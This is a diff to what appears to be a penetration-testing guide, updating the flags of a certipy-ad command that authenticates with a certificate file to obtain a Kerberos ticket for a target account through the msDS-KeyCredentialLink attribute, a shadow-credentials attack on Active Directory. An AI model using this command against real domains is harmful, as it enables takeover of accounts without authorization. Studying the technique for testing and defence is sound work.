@@ -71,8 +71,9 @@ Use the generated `.pfx` and the private key with a tool capable of PKINIT, such
 certipy-ad auth \
   -dc-ip <DC_IP> \
   -pfx target.pfx \
-  -pfx-password '<PFX_PASSWORD>' \
-  -principal target@domain.local
+  -password '<PFX_PASSWORD>' \
+  -username <username> \
+  -domain <domain>
 ```
 
 This will obtain a **Kerberos TGT** for the target account based on the public key stored in `msDS-KeyCredentialLink`. 
